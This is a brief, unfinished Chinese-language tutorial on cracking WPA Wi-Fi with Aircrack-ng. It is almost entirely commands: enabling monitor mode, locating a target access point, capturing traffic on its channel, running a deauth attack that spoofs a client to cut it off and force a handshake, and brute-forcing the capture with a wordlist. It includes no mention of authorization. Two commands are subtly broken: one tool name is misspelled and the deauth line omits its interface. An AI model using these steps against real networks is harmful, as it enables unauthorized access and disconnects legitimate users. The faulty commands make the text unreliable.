# Aircrack-ng

[Aircrack-ng 官网](https://www.aircrack-ng.org/)

:::warning
此文档还未完善
:::

## 使网卡进入监听模式

查看当前无线网卡标识

```sh
ip a
```

激活网卡

```sh
airmon-ng start wlan0
```

激活后再次查看网卡标识，会发现名称后面多了个`mon`

## 寻找目标AP

使用`airodump-ng`抓包

```sh
airodump-ng wlan0mon
```

条件
* 有用户已经连上了目标AP。
* 目标的信号足够稳定

需要记住的目标AP相关信息：

* BSSID
* MAC地址
* 频道

## 监听目标频道

假设频道是11，将监听记录写入`ch11`开头的文件中

实际生成的文件名形如 `ch11-01.cap`

```sh
ariodump-ng -c 11 -w ch11 wlan0mon
```

## 等待握手包

当有设备尝试连接目标AP时，airodump-ng就能捕获其握手数据报文。

可以通过 deauth 攻击迫使其他设备重新连接。

首先找一个连上了 airodump-ng 的较活跃的客户端，记住其MAC地址。用`aireplay-ng`命令伪装成该地址向AP发起攻击。

```sh
AP=目标AP的MAC地址
CLIENT=伪装成的客户端MAC地址
aireplay-ng -0 2 -a $AP -c $CLIENT
```

发起攻击后，那个真正的客户端会断网，可能会立即尝试重新连接，于是就可以捕获到握手数据报文了。

## 暴力破解

首先需要拥有字典。

::: info
可以使用Crunch工具生成字典。
:::

```sh
aircrack-ng -w dict.txt ch11-01.cap
```
